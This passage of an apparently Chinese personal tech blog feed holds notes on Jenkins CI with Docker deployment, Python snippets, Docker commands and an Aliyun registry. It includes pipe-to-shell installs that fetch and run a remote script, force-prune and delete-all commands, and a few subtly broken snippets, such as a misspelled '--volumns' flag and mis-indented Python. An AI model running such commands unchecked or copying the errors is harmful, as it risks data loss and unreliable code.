targets</p><p><img src="/images/jenkins-CI.assets/image-20250215000704471.png" alt="image-20250215000704471"></p><p>clean package  -DskipTests</p><p><img src="/images/jenkins-CI.assets/image-20250215000836498.png" alt="image-20250215000836498"></p><p>构建，第一次构建较长时间，需要下载maven依赖</p><p><img src="/images/jenkins-CI.assets/image-20250215001051732.png" alt="image-20250215001051732"></p><h3 id="成功构建"><a href="#成功构建" class="headerlink" title="成功构建"></a>成功构建</h3><p><img src="/images/jenkins-CI.assets/image-20250215003330864.png" alt="image-20250215003330864"></p><h2 id="添加构建后操作"><a href="#添加构建后操作" class="headerlink" title="添加构建后操作"></a>添加构建后操作</h2><p><img src="/images/jenkins-CI.assets/image-20250215202244451.png" alt="image-20250215202244451"></p><h3 id="设置把jar文件拷贝过来"><a href="#设置把jar文件拷贝过来" class="headerlink" title="设置把jar文件拷贝过来"></a>设置把jar文件拷贝过来</h3><p><img src="/images/jenkins-CI.assets/image-20250215202423499.png" alt="image-20250215202423499"></p><h3 id="先前设置的拷贝的机器和目录"><a href="#先前设置的拷贝的机器和目录" class="headerlink" title="先前设置的拷贝的机器和目录"></a>先前设置的拷贝的机器和目录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.128.152</span><br><span class="line">/usr/local/test/</span><br></pre></td></tr></table></figure><p><img src="/images/jenkins-CI.assets/image-20250215202654109.png" alt="image-20250215202654109"></p><h3 id="再次构建，成功拷贝文件"><a href="#再次构建，成功拷贝文件" class="headerlink" title="再次构建，成功拷贝文件"></a>再次构建，成功拷贝文件</h3><p><img src="/images/jenkins-CI.assets/image-20250215203001810.png" alt="image-20250215203001810"></p><p><img src="/images/jenkins-CI.assets/image-20250215203033916.png" alt="image-20250215203033916"></p><h3 id="运行jar文件"><a href="#运行jar文件" class="headerlink" title="运行jar文件"></a>运行jar文件</h3><h4 id="创建docker目录和文件"><a href="#创建docker目录和文件" class="headerlink" title="创建docker目录和文件"></a>创建docker目录和文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Dockerfile内容:</span><br><span class="line">FROM docker.1ms.run/bitnami/java:21</span><br><span class="line">COPY mytest.jar /usr/local/</span><br><span class="line">WORKDIR /usr/local</span><br><span class="line">CMD java -jar mytest.jar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker-compose.yml内容：</span><br><span class="line">services:</span><br><span class="line">  mytest:</span><br><span class="line">    build:</span><br><span class="line">      context: ./</span><br><span class="line">      dockerfile: Dockerfile</span><br><span class="line">    image: mytest:v1.0.0</span><br><span class="line">    container_name: mytest</span><br><span class="line">    ports:</span><br><span class="line">     - 8081:8080</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/jenkins-CI.assets/image-20250215211848531.png" alt="image-20250215211848531"></p><h4 id="推送构建"><a href="#推送构建" class="headerlink" title="推送构建"></a>推送构建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .# 添加解决后的文件到暂存区</span><br><span class="line">git commit -m &quot;my 5555 commit&quot;# 提交解决后的更改</span><br><span class="line">git push -u origin master#推送更改</span><br></pre></td></tr></table></figure><p><img src="/images/jenkins-CI.assets/image-20250215212055332.png" alt="image-20250215212055332"></p><h4 id="追加命令"><a href="#追加命令" class="headerlink" title="追加命令"></a>追加命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">target/*.jar docker/*</span><br><span class="line"></span><br><span class="line">cd /usr/local/test/docker</span><br><span class="line">mv ../target/*.jar ./</span><br><span class="line">docker-compose down</span><br><span class="line">docker-compose up -d --build</span><br><span class="line">docker image  prune -f    #删除none标记的镜像</span><br><span class="line"></span><br><span class="line">先下好java镜像，速度比较快</span><br><span class="line">docker pull docker.1ms.run/bitnami/java:21</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/jenkins-CI.assets/image-20250215222655118.png" alt="image-20250215222655118"></p><p><img src="/images/jenkins-CI.assets/image-20250215222737596.png" alt="image-20250215222737596"></p><p><img src="/images/jenkins-CI.assets/image-20250215222750793.png" alt="image-20250215222750793"></p><h2 id="成功构建运行"><a href="#成功构建运行" class="headerlink" title="成功构建运行"></a>成功构建运行</h2><p><img src="/images/jenkins-CI.assets/image-20250215222821508.png" alt="image-20250215222821508"></p><h1 id="基于tag标签拉取构建"><a href="#基于tag标签拉取构建" class="headerlink" title="基于tag标签拉取构建"></a>基于tag标签拉取构建</h1><p><img src="/images/jenkins-CI.assets/image-20250215225405936.png" alt="image-20250215225405936"></p><p><img src="/images/jenkins-CI.assets/image-20250215225519581.png" alt="image-20250215225519581"></p><p><img src="/images/jenkins-CI.assets/image-20250215225613150.png" alt="image-20250215225613150"></p><h2 id="拖到maven前面"><a href="#拖到maven前面" class="headerlink" title="拖到maven前面"></a>拖到maven前面</h2><p><img src="/images/jenkins-CI.assets/image-20250215225748752.png" alt="image-20250215225748752"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout $tag</span><br></pre></td></tr></table></figure><p><img src="/images/jenkins-CI.assets/image-20250215225848584.png" alt="image-20250215225848584"></p><h3 id="gitlab打标签"><a href="#gitlab打标签" class="headerlink" title="gitlab打标签"></a>gitlab打标签</h3><p><img src="/images/jenkins-CI.assets/image-20250215230033207.png" alt="image-20250215230033207"></p><p><img src="/images/jenkins-CI.assets/image-20250215230119520.png" alt="image-20250215230119520"></p><h3 id="重新做一个v2-0-0-push"><a href="#重新做一个v2-0-0-push" class="headerlink" title="重新做一个v2.0.0 push"></a>重新做一个v2.0.0 push</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .# 添加解决后的文件到暂存区</span><br><span class="line">git commit -m &quot;my v2.0.0 commit&quot;# 提交解决后的更改</span><br><span class="line">git push -u origin master#推送更改</span><br></pre></td></tr></table></figure><p><img src="/images/jenkins-CI.assets/image-20250215230303233.png" alt="image-20250215230303233"></p><p><img src="/images/jenkins-CI.assets/image-20250215230836741.png" alt="image-20250215230836741"></p><h3 id="jenkins构建发生变化"><a href="#jenkins构建发生变化" class="headerlink" title="jenkins构建发生变化"></a>jenkins构建发生变化</h3><p><img src="/images/jenkins-CI.assets/image-20250215230548351.png" alt="image-20250215230548351"></p><p><img src="/images/jenkins-CI.assets/image-20250215230608741.png" alt="image-20250215230608741"></p><h4 id="成功运行"><a href="#成功运行" class="headerlink" title="成功运行"></a>成功运行</h4><p><img src="/images/jenkins-CI.assets/image-20250215230904411.png" alt="image-20250215230904411"></p><p><img src="/images/jenkins-CI.assets/image-20250215230720067.png" alt="image-20250215230720067"></p>]]></content>
      
      
      <categories>
          
          <category> DevOps环境搭建 </category>
          
          <category> jenkins </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CI/CD </tag>
            
            <tag> docker </tag>
            
            <tag> jenkins </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python语句</title>
      <link href="/2025/03/09/python%E8%AF%AD%E5%8F%A5/"/>
      <url>/2025/03/09/python%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="改源命令行临时使用："><a href="#改源命令行临时使用：" class="headerlink" title="改源命令行临时使用："></a>改源命令行临时使用：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install xxxx -i https://pypi.tuna.tsinghua.edu.cn/simple </span><br><span class="line"></span><br><span class="line">pip3 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python38\pip\pip.ini</span><br><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.system(&#x27;netstat -an | find &quot;:443&quot; | find &quot;ESTABLISHED&quot;&#x27;)</span><br><span class="line">获取命令结果</span><br><span class="line">info=os.popen(&#x27;netstat -an | find &quot;:443&quot; | find &quot;ESTABLISHED&quot;&#x27;).readlines()</span><br></pre></td></tr></table></figure><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f1 = open(&quot;num.txt&quot;,&quot;r&quot;,encoding=&#x27;UTF-8&#x27;)</span><br><span class="line">lines = f1.readlines()#读取全部内容</span><br><span class="line">lines = [line.rstrip() for line in lines if line.strip()] #去掉空行</span><br><span class="line">#lines = [line.rstrip(&#x27;\n&#x27;) for line in lines] #去掉换行符</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="启动http服务"><a href="#启动http服务" class="headerlink" title="启动http服务"></a>启动http服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 44444</span><br><span class="line"></span><br><span class="line">后台运行：</span><br><span class="line">nohup python3 -m http.server 8000 &amp;</span><br></pre></td></tr></table></figure><h3 id="启动FTP服务"><a href="#启动FTP服务" class="headerlink" title="启动FTP服务"></a>启动FTP服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FTP进入指定目录</span><br><span class="line">python3 -m pyftpdlib -p 2121</span><br><span class="line"></span><br><span class="line">ftp://xxx.xxx.xxx.xxx:2121</span><br></pre></td></tr></table></figure><h2 id="获取目录文件"><a href="#获取目录文件" class="headerlink" title="获取目录文件"></a>获取目录文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#当前程序目录</span><br><span class="line">current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))</span><br><span class="line">#目录</span><br><span class="line">dirname =os.path.dirname(path)</span><br><span class="line">#文件名</span><br><span class="line">dirname2=os.path.basename(path)</span><br><span class="line">#后缀</span><br><span class="line">src_item.split(&quot;.&quot;)[-1]</span><br></pre></td></tr></table></figure><p>获取目录或文件全路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">def get_file_paths(directory):</span><br><span class="line">    file_paths = []</span><br><span class="line">    for root, dirs, files in os.walk(directory):</span><br><span class="line">        for file in dirs:</span><br><span class="line">            file_path = os.path.join(root, file)</span><br><span class="line">            file_paths.append(file_path)</span><br><span class="line">    return file_paths</span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:   </span><br><span class="line">for file_path in get_file_paths(r&quot;D:\123&quot;):</span><br><span class="line">    print(file_path)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h2 id="python接收输入参数"><a href="#python接收输入参数" class="headerlink" title="python接收输入参数"></a>python接收输入参数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src_dir = &#x27;&#x27;.join(sys.argv[1:])</span><br></pre></td></tr></table></figure><p>  传递参数</p><pre><code>  if len(sys.argv) != 4:        print(&quot;Usage: python script.py input_file output_file num_processes&quot;)        sys.exit(1)input_file, output_file, num_processes = sys.argv[1], sys.argv[2], int(sys.argv[3])</code></pre><h2 id="字符串截取最后斜杠之前"><a href="#字符串截取最后斜杠之前" class="headerlink" title="字符串截取最后斜杠之前"></a>字符串截取最后斜杠之前</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parts=s.rsplit(&#x27;/&#x27;, 1)</span><br><span class="line">return parts[0] if len(parts) &gt; 1 else s</span><br></pre></td></tr></table></figure><h2 id="去掉相同部分字符"><a href="#去掉相同部分字符" class="headerlink" title="去掉相同部分字符"></a>去掉相同部分字符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str1 = r&quot;F:\123teh&quot;</span><br><span class="line">str2 = r&quot;F:\123teh\result-9390\hkRGaUQi0IiFMq1ugnOc\wwwwww.txt   &quot;</span><br><span class="line">xored_str=str2.replace(str1, &quot;&quot;)</span><br><span class="line">替换反斜杠</span><br><span class="line">xored_str2=xored_str.replace(&quot;\\&quot;, &quot;/&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def get_last_colon_before(s):</span><br><span class="line">    index = s.rfind(&#x27;\\&#x27;)  # 获取最后一个点号的索引</span><br><span class="line">    if index != -1:</span><br><span class="line">        return s[:index]  # 返回点前的部分</span><br><span class="line">    else:</span><br><span class="line">        return s  # 如果没有点号，返回原字符串</span><br><span class="line"></span><br><span class="line">parts=get_last_colon_before(path)</span><br></pre></td></tr></table></figure><h2 id="分块读文件"><a href="#分块读文件" class="headerlink" title="分块读文件"></a>分块读文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def file_size(input_file_path):</span><br><span class="line">    chunk_size = 16 * 1024  # 16 KB</span><br><span class="line">    num=0</span><br><span class="line">    with open(input_file_path, &#x27;rb&#x27;) as infile:</span><br><span class="line">        while True:</span><br><span class="line">            chunk = infile.read(chunk_size)</span><br><span class="line">            num+=1</span><br><span class="line">            if not chunk:</span><br><span class="line">                break</span><br><span class="line">            print(num)</span><br></pre></td></tr></table></figure><h2 id="正则提取"><a href="#正则提取" class="headerlink" title="正则提取"></a>正则提取</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">f1 = open(&quot;D:\\主机名-IP\\主机-IP-2.txt&quot;,&quot;r&quot;,encoding=&#x27;UTF-8&#x27;)</span><br><span class="line">lines = f1.readlines()#读取全部内容</span><br><span class="line">f2=open(&#x27;D:\\主机名-IP\\9999.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">#f2.seek(2)</span><br><span class="line">for line in lines:</span><br><span class="line">    a1=re.findall(r&#x27;ip_address&quot;\:\[&quot;(.+?)&quot;&#x27;,line,re.M)</span><br><span class="line">    a2=re.findall(r&#x27;host_name&quot;\:&quot;(.+?)&quot;&#x27;,line,re.M)</span><br><span class="line">    a3=re.findall(r&#x27;operating_system&quot;:&quot;(.+?)&quot;&#x27;,line,re.M)</span><br><span class="line"></span><br><span class="line">    if len(a1)&gt;=0:</span><br><span class="line">        print(a1,a2,a3)</span><br><span class="line">        f2.write(str(a1)+&quot; &quot;+str(a2)+&quot; &quot;+str(a3)+&quot;\n&quot;)</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br><span class="line">    #f2.write(str(aa)+&quot;\n&quot;)</span><br><span class="line">f1.close()</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker命令</title>
      <link href="/2025/03/08/docker%E5%91%BD%E4%BB%A4/"/>
      <url>/2025/03/08/docker%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO- https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><h2 id="安装-Docker-Compose"><a href="#安装-Docker-Compose" class="headerlink" title="安装 Docker-Compose"></a>安装 Docker-Compose</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><h2 id="Docker-设置国内镜像源"><a href="#Docker-设置国内镜像源" class="headerlink" title="Docker 设置国内镜像源"></a>Docker 设置国内镜像源</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://docker.1ms.run&quot;,</span><br><span class="line">  &quot;https://hub.rat.dev&quot;,</span><br><span class="line">&quot;https://docker.1panel.live&quot;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="命令："><a href="#命令：" class="headerlink" title="命令："></a>命令：</h2><ul><li><p>docker images</p></li><li><p>docker ps -q 列出所有运行中容器的ID。</p></li><li><p>docker stop 停止一个或多个运行中的容器。</p></li><li><p>docker rm 移除一个或docker rmi多个容器。</p></li><li><p>docker rm 删除容器</p></li><li><p>docker rmi 删除镜像</p></li><li><p>删除所有容器 docker rm -f  $(docker ps -a -q)   </p></li><li><p>启动 docker-compose -p xxx up -d</p></li></ul><p>停止所有运行中的Docker容器，可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop $(docker ps -q) </span><br></pre></td></tr></table></figure><p>如果你想要同时停止并移除这些容器，可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm $(docker stop $(docker ps -a -q))  </span><br></pre></td></tr></table></figure><p>这将列出所有活动的容器，包括容器ID、创建时间、状态和其他相关信息。</p><p>如果你想查看所有容器，无论它们的状态如何（运行、停止等），可以使用 <code>-a</code> 或 <code>--all</code> 选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a </span><br></pre></td></tr></table></figure><p>如果你只想获取容器ID，可以使用<code>--format</code>来定制输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -q</span><br></pre></td></tr></table></figure><h2 id="指定端口启动创建进入容器"><a href="#指定端口启动创建进入容器" class="headerlink" title="指定端口启动创建进入容器"></a>指定端口启动创建进入容器</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 9992:80 -p 8882:8888 -it ubuntu /bin/bash</span><br><span class="line">docker run --name web1 -p 9991:80 -p 8881:8888 -it centos /bin/bash</span><br></pre></td></tr></table></figure><h2 id="导出导入镜像"><a href="#导出导入镜像" class="headerlink" title="导出导入镜像"></a>导出导入镜像</h2><p>export\import 导入导出</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker export web &gt; /home/docker_web.tar</span><br><span class="line">docker import /home/docker_web.tar</span><br></pre></td></tr></table></figure><p>save\load 导入导出</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker save 9610cfc68e8d &gt; /home/docker_web.tar</span><br><span class="line">docker load &lt; /home/docker_web.tar</span><br></pre></td></tr></table></figure><p>export\import 与 save\load 的区别：</p><ul><li>export\import 导出的镜像文件大小要小于 save\load 导出的镜像</li><li>export\import 是根据容器拿到的镜像，再导入时会丢失镜像所有的历史，所以无法进行回滚操作；而 save\load 的镜像，没有丢失镜像的历史，可以回滚到之前的层。</li></ul><p>核心原因是 export 是针对容器的导出，所以只有所有层组合的最终版本；而 save 则是针对镜像的，所以可以看到每一层的信息。</p><h2 id="端口占用"><a href="#端口占用" class="headerlink" title="端口占用"></a>端口占用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker rm $(docker stop $(docker ps -a -q))  </span><br><span class="line">sudo rm /var/lib/docker/network/files/local-kv.db</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h2 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h2><p>docker ps -a</p><p>查看容器详细信息</p><p>docker inspect d8f56b49b</p><p>查看容器的实时日志</p><p>docker logs -f d8f56b49b</p><p> docker exec -u www-data -it d8f56b49b &#x2F;bin&#x2F;bash</p><p>systemctl status docker</p><p>修改镜像名字<br>docker tag <image-id> xxx:1.8.3</p><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker cp 本地文件路径 ID全称:容器路径</span><br><span class="line"></span><br><span class="line"># 或者</span><br><span class="line"></span><br><span class="line">docker cp ID全称:容器文件路径 本地路径</span><br></pre></td></tr></table></figure><h2 id="Docker-资源清理"><a href="#Docker-资源清理" class="headerlink" title="Docker 资源清理"></a>Docker 资源清理</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker container prune# 删除所有退出状态的容器</span><br><span class="line">docker image prune# 删除 dangling 或所有未被使用的镜像</span><br><span class="line">docker network prune# 删除所有未使用的网络</span><br><span class="line">docker volume prune# 删除未被使用的数据卷</span><br><span class="line">docker system prune# 删除已停止的容器、dangling 镜像、未被容器引用的 network 和构建过程中的 cache，安全起见，这个命令默认不会删除那些未被任何容器引用的数据卷，如果需要同时删除这些数据卷，你需要显式的指定 --volumns 参数</span><br><span class="line">docker system prune --all --force --volumns # 这次不仅会删除数据卷，而且连确认的过程都没有了！注意，使用 --all 参数后会删除所有未被引用的镜像而不仅仅是 dangling 镜像</span><br></pre></td></tr></table></figure><h2 id="卸载Docker"><a href="#卸载Docker" class="headerlink" title="卸载Docker"></a>卸载Docker</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum list installed | grep docker</span><br><span class="line">yum -y remove docker.x86_64</span><br></pre></td></tr></table></figure><h2 id="卸载Docker-compose"><a href="#卸载Docker-compose" class="headerlink" title="卸载Docker-compose"></a>卸载Docker-compose</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打包绿色免安装程序</title>
      <link href="/2025/03/08/%E6%89%93%E5%8C%85%E7%BB%BF%E8%89%B2%E5%85%8D%E5%AE%89%E8%A3%85%E5%8C%85/"/>
      <url>/2025/03/08/%E6%89%93%E5%8C%85%E7%BB%BF%E8%89%B2%E5%85%8D%E5%AE%89%E8%A3%85%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p><strong>下载enigma virtual box</strong></p><p><a href="https://www.enigmaprotector.com/en/downloads.html">https://www.enigmaprotector.com/en/downloads.html</a></p><p>enigmavb.exe</p><p>1、文件选项：</p><p>文件-增加-增加文件夹([递归)(X)</p><p>文件夹选项-勾选启用文件虚拟化，压缩文件</p><p>2、注册表：</p><p>注册表选项-勾选启用注册表虚拟化</p><p>3、最后执行封包</p><p>参考：</p><p><a href="https://www.bilibili.com/video/BV1sP41197A9/?vd_source=4efa777d46268bbd7644334c25d41159">https://www.bilibili.com/video/BV1sP41197A9/?vd_source=4efa777d46268bbd7644334c25d41159</a></p>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
          <category> 实用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实用工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云镜像服务</title>
      <link href="/2025/03/08/%E9%98%BF%E9%87%8C%E4%BA%91%E9%95%9C%E5%83%8F%E6%9C%8D%E5%8A%A1/"/>
      <url>/2025/03/08/%E9%98%BF%E9%87%8C%E4%BA%91%E9%95%9C%E5%83%8F%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="私有需要认证"><a href="#私有需要认证" class="headerlink" title="私有需要认证"></a>私有需要认证</h1><p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances">https://cr.console.aliyun.com/cn-hangzhou/instances</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker login --username=r_r_r_r crpi-oep0r0ys6k2kecir.cn-guangzhou.personal.cr.aliyuncs.com</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull crpi-oep0r0ys6k2kecir.cn-guangzhou.personal.cr.aliyuncs.com/netimages/redis:7.4.1</span><br></pre></td></tr></table></figure><h2 id="docker修改镜像名称"><a href="#docker修改镜像名称" class="headerlink" title="docker修改镜像名称"></a>docker修改镜像名称</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker tag SOURCE_IMAGE[:TAG] TARGET_IMAGE[:TAG]</span><br><span class="line">docker tag crpi-oep0r0ys6k2kecir.cn-guangzhou.personal.cr.aliyuncs.com/netimages/redis:7.4.1  redis:7.4.1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img 